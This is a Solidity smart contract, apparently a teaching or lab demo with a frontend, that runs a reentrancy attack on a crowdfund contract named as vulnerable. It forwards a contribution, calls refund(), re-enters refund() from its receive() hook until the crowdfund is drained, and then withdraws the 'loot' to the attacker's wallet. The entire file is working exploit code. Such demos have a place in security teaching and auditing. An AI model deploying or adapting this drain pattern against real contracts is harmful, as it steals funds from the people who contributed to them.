// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfundVulnerable {
    function contribute() external payable;
    function refund() external;
    function getBalance() external view returns (uint256);
    function goal() external view returns (uint256);
    function totalRaised() external view returns (uint256);
}

contract RefundAttacker {
    ICrowdfundVulnerable public crowdfund;
    address public attacker;

    uint256 public lastContribution;  // last contribution size
    uint256 public attackAmount;      // amount used per refund re-entry

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    event AttackTriggered(uint256 attackAmount, uint256 crowdfundBalance);
    event ContributionForwarded(uint256 amount);
    event LootWithdrawn(uint256 amount);

    constructor(address _crowdfund) {
        crowdfund = ICrowdfundVulnerable(_crowdfund);
        attacker  = msg.sender;
    }

    /**
     * STEP 1 – Attacker contributes via this contract
     * UI button: "Contribute / Deposit"
     *
     * Attacker wallet sends ETH to this function.
     * The contract forwards it to crowdfund.contribute()
     * and records attackAmount = msg.value for reentrancy.
     */
    function depositToCrowdfund() external payable onlyAttacker {
        require(msg.value > 0, "No ETH sent");

        lastContribution = msg.value;
        attackAmount     = msg.value; // used in receive() re-entrancy

        // forward contribution to vulnerable crowdfund
        crowdfund.contribute{value: msg.value}();

        emit ContributionForwarded(msg.value);
    }

    /**
     * STEP 2 – Trigger the reentrancy via refund()
     * UI button: "Run Attack"
     *
     * We do NOT send value here. We just call refund(),
     * which will send ETH back to this contract and hit receive().
     */
    function runAttack() external onlyAttacker {
        require(attackAmount > 0, "Call depositToCrowdfund first");

        uint256 before = address(crowdfund).balance;
        crowdfund.refund();

        emit AttackTriggered(attackAmount, before);
    }

    /**
     * STEP 3 – Withdraw the stolen ETH to attacker EOA
     * UI button: "Withdraw Loot"
     */
    function withdrawLoot() external onlyAttacker {
        uint256 bal = address(this).balance;
        require(bal > 0, "No loot");

        (bool ok, ) = attacker.call{value: bal}("");
        require(ok, "Withdraw failed");

        emit LootWithdrawn(bal);
    }

    /**
     * Reentrancy hook: each time crowdfund sends us ETH in refund(),
     * this receive() is called. While the crowdfund still has at
     * least attackAmount ETH, we ask for another refund.
     */
    receive() external payable {
        uint256 crowdfundBalance = address(crowdfund).balance;

        if (crowdfundBalance >= attackAmount && attackAmount > 0) {
            crowdfund.refund();
        } else {
            // stop condition – prevent infinite loop if drained
            attackAmount = 0;
        }
    }

    // ===== View helpers for the frontend =====

    function getCrowdfundInfo()
        external
        view
        returns (uint256 _goal, uint256 _totalRaised, uint256 _balance)
    {
        _goal        = crowdfund.goal();
        _totalRaised = crowdfund.totalRaised();
        _balance     = crowdfund.getBalance();
    }

    function getAttackerContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
